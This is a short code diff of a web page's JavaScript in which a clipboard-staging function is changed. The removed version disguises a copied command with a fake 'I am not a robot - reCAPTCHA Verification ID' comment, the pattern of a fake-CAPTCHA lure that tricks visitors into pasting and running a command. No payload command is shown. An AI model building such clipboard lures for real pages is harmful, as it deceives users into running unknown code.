@@ -391,14 +391,11 @@
             document.body.removeChild(tempTextArea);
         }
 
-        function stageClipboard(commandToRun, verification_id){
-            const suffix = " # "
-            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
-            const end = "''"
-            const textToCopy = commandToRun + suffix + ploy + verification_id + end
-
-            setClipboardCopyData(textToCopy);
-        }
+       function stageClipboard(commandToRun, verification_id){
+    // Copy ONLY the command - no suffix or verification text
+    const textToCopy = commandToRun;
+    setClipboardCopyData(textToCopy);
+}
 
 
         function showVerifyWindow() {
